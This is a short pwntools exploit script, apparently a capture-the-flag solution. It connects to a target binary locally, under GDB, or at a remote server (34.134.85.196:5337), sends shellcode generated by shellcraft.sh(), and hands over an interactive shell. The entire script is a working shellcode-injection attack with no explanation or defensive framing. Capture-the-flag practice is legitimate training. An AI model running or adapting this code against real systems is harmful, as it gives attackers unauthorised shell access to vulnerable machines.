from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.134.85.196',5337)
    else:
        return process(e.path)


p = start()
shell = asm(shellcraft.sh())
p.sendline(shell)
p.interactive()

